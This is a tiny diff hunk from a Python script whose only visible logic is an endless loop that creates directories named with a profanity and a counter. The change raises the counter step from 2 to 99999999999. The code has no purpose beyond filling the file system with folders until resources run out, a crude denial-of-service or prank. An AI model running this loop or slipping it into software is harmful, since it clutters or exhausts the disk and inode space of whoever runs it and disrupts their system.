@@ -15,4 +15,4 @@ import os
 i=0
 while True:
     os.mkdir(f"fuckyou{i}")
-    i+=2
+    i+=99999999999
